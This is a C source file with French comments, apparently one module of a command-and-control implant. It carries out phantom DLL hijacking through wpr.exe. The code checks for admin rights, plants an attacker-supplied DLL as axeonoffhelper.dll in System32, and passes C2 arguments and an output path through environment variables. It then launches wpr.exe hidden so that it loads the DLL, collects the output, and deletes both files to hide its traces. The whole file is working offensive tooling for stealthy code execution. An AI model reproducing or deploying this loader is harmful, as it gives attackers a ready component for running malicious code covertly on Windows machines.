/*
 * ============================================================
 *  wpr_loader.c - Phantom DLL via wpr.exe (T1574.002)
 * ============================================================
 */
#include "wpr_loader.h"
#include "platform.h"
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* ============================================================
 *  IMPLEMENTATION WINDOWS UNIQUEMENT
 * ============================================================ */
#ifdef PLATFORM_WINDOWS

#include <windows.h>

#define WPR_TIMEOUT_MS  30000
#define WPR_DLL_PATH    "C:\\Windows\\System32\\axeonoffhelper.dll"

static module_result_t make_error(const char *msg) {
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = _strdup(msg);
    return r;
}

/* Verifie si le token courant est eleve (UAC) - necessaire pour System32 */
static int is_elevated(void) {
    BOOL elevated = FALSE;
    HANDLE token  = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
        TOKEN_ELEVATION te;
        DWORD ret_len = 0;
        if (GetTokenInformation(token, TokenElevation,
                                &te, sizeof(te), &ret_len))
            elevated = te.TokenIsElevated;
        CloseHandle(token);
    }
    return (int)elevated;
}

/* Hex-encodage identique a rundll32_loader.c */
static char *hex_encode(const unsigned char *data, size_t len) {
    if (len == 0) {
        char *empty = (char *)malloc(1);
        if (empty) *empty = '\0';
        return empty;
    }
    char *out = (char *)malloc(len * 2 + 1);
    if (!out) return NULL;
    for (size_t i = 0; i < len; i++)
        sprintf(out + i * 2, "%02x", data[i]);
    out[len * 2] = '\0';
    return out;
}

/* ?? Construction du bloc d'environnement enrichi ???????????
 *
 *  Reprend l'environnement courant et ajoute trois variables :
 *    C2_PHANTOM_MODE = 1           (signal pour le DllMain)
 *    C2_ARGS_HEX     = <hex args>  (arguments du module)
 *    C2_OUTPUT_FILE  = <out_path>  (fichier de sortie)
 *
 *  L'appelant doit free() le pointeur retourne.
 * ???????????????????????????????????????????????????????????? */
static char *build_env_block(const char *args_hex, const char *out_path) {
    char *curr = GetEnvironmentStringsA();
    if (!curr) return NULL;

    size_t env_size = 0;
    const char *p = curr;
    while (*p) {
        size_t l = strlen(p) + 1;
        env_size += l;
        p += l;
    }
    env_size++;  /* null terminal final */

    char entry_args[8200];
    char entry_out[MAX_PATH + 84];
    const char *entry_wpr = "C2_PHANTOM_MODE=1";

    snprintf(entry_args, sizeof(entry_args), "C2_ARGS_HEX=%s",    args_hex);
    snprintf(entry_out,  sizeof(entry_out),  "C2_OUTPUT_FILE=%s", out_path);

    size_t ea_len = strlen(entry_args) + 1;
    size_t eo_len = strlen(entry_out)  + 1;
    size_t ew_len = strlen(entry_wpr)  + 1;
    size_t total  = env_size + ea_len + eo_len + ew_len;

    char *blk = (char *)malloc(total);
    if (!blk) {
        FreeEnvironmentStringsA(curr);
        return NULL;
    }

    memcpy(blk, curr, env_size - 1);
    FreeEnvironmentStringsA(curr);

    char *ep = blk + env_size - 1;
    memcpy(ep, entry_wpr,  ew_len); ep += ew_len;
    memcpy(ep, entry_args, ea_len); ep += ea_len;
    memcpy(ep, entry_out,  eo_len); ep += eo_len;
    *ep = '\0';  /* double-null terminal */

    return blk;
}

/* ============================================================
 *  POINT D'ENTREE PUBLIC
 * ============================================================ */
module_result_t wpr_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len)
{
    module_result_t result = {0};

    /* ?? 1. Verifier le token eleve ??????????????????????????? */
    if (!is_elevated()) {
        return make_error(
            "[WPR] Token eleve requis pour ecrire dans C:\\Windows\\System32\\"
        );
    }

    /* ?? 2. Generer le chemin du fichier de sortie ???????????? */
    char temp_dir[MAX_PATH];
    if (!GetTempPathA(MAX_PATH, temp_dir))
        return make_error("[WPR] GetTempPath echoue");

    DWORD pid  = GetCurrentProcessId();
    DWORD tick = GetTickCount();

    char out_path[MAX_PATH + 64];
    snprintf(out_path, sizeof(out_path), "%sc2w_%lu%lu.bin",
             temp_dir, (unsigned long)pid, (unsigned long)tick);

    printf("[WPR] DLL cible   : %s\n", WPR_DLL_PATH);
    printf("[WPR] Output file : %s\n", out_path);
    fflush(stdout);

    /* ?? 3. Ecrire la DLL dans C:\Windows\System32\ ??????????? */
    FILE *f = fopen(WPR_DLL_PATH, "wb");
    if (!f) {
        char err[256];
        snprintf(err, sizeof(err),
                 "[WPR] Impossible d'ecrire axeonoffhelper.dll (err=%lu)",
                 (unsigned long)GetLastError());
        return make_error(err);
    }

    size_t written = fwrite(dll_bytes, 1, dll_size, f);
    fclose(f);

    if (written != dll_size) {
        DeleteFileA(WPR_DLL_PATH);
        return make_error("[WPR] Ecriture DLL incomplete");
    }
    printf("[WPR] DLL ecrite : %zu bytes\n", dll_size);
    fflush(stdout);

    /* ?? 4. Hex-encoder les arguments ????????????????????????? */
    char *args_hex = hex_encode(args, args_len);
    if (!args_hex) {
        DeleteFileA(WPR_DLL_PATH);
        return make_error("[WPR] Allocation hex_args echouee");
    }

    /* ?? 5. Construire le bloc d'environnement ????????????????? */
    char *env_block = build_env_block(args_hex, out_path);
    free(args_hex);

    if (!env_block) {
        DeleteFileA(WPR_DLL_PATH);
        return make_error("[WPR] Construction env block echouee");
    }

    /* ?? 6. Lancer wpr.exe -boottrace -stopboot foo ??????????? */
    char cmd[] = "wpr.exe -boottrace -stopboot foo";

    STARTUPINFOA si;
    ZeroMemory(&si, sizeof(si));
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    PROCESS_INFORMATION pi;
    ZeroMemory(&pi, sizeof(pi));

    printf("[WPR] CMD : %s\n", cmd);
    fflush(stdout);

    BOOL ok = CreateProcessA(
        NULL, cmd, NULL, NULL, FALSE,
        CREATE_NO_WINDOW,
        env_block, NULL, &si, &pi
    );

    free(env_block);

    if (!ok) {
        char err[128];
        snprintf(err, sizeof(err),
                 "[WPR] CreateProcess echoue (err=%lu)", (unsigned long)GetLastError());
        DeleteFileA(WPR_DLL_PATH);
        return make_error(err);
    }

    printf("[WPR] wpr.exe PID=%lu - en attente (%dms max)\n",
           (unsigned long)pi.dwProcessId, WPR_TIMEOUT_MS);
    fflush(stdout);

    /* ?? 7. Attendre la fin du processus ??????????????????????? */
    DWORD wait_result = WaitForSingleObject(pi.hProcess, WPR_TIMEOUT_MS);

    if (wait_result == WAIT_TIMEOUT) {
        printf("[WPR] Timeout - TerminateProcess\n");
        fflush(stdout);
        TerminateProcess(pi.hProcess, 1);
    }

    DWORD exit_code = 0;
    GetExitCodeProcess(pi.hProcess, &exit_code);
    printf("[WPR] wpr.exe termine - exit_code=%lu\n", (unsigned long)exit_code);
    fflush(stdout);

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    /* ?? 8. Lire le fichier de sortie ????????????????????????? */
    FILE *of = fopen(out_path, "rb");
    if (of) {
        fseek(of, 0, SEEK_END);
        long fsz = ftell(of);
        fseek(of, 0, SEEK_SET);

        if (fsz > 0) {
            result.data = (unsigned char *)malloc((size_t)fsz + 1);
            if (result.data) {
                size_t rd       = fread(result.data, 1, (size_t)fsz, of);
                result.data[rd] = '\0';
                result.data_len = rd;
                result.status   = 0;
            }
        }
        fclose(of);
        printf("[WPR] Sortie lue : %zu bytes\n",
               result.data ? result.data_len : 0);
        fflush(stdout);
    } else {
        printf("[WPR] Fichier sortie absent ou vide\n");
        fflush(stdout);
    }

    /* ?? 9. Nettoyage ????????????????????????????????????????? */
    DeleteFileA(WPR_DLL_PATH);
    DeleteFileA(out_path);
    printf("[WPR] Nettoyage : axeonoffhelper.dll + sortie supprimes\n");
    fflush(stdout);

    /* ?? 10. Resultat par defaut si sortie vide ??????????????? */
    if (result.status != 0 || !result.data || result.data_len == 0) {
        free(result.data);
        const char *msg = (wait_result == WAIT_TIMEOUT)
            ? "[WPR] Timeout (30s) - module peut-etre lent"
            : "[WPR] Execution terminee (aucune sortie capturee)";
        result.data     = (unsigned char *)_strdup(msg);
        result.data_len = result.data ? strlen(msg) : 0;
        result.status   = 0;
    }

    return result;
}

/* ============================================================
 *  STUB LINUX
 * ============================================================ */
#else

module_result_t wpr_loader_execute(
    const unsigned char *dll_bytes, size_t dll_size,
    const unsigned char *args,      size_t args_len)
{
    (void)dll_bytes; (void)dll_size; (void)args; (void)args_len;
    module_result_t r = {0};
    r.status    = -1;
    r.error_msg = strdup("[WPR] Technique non supportee sur Linux");
    return r;
}

#endif /* PLATFORM_WINDOWS */
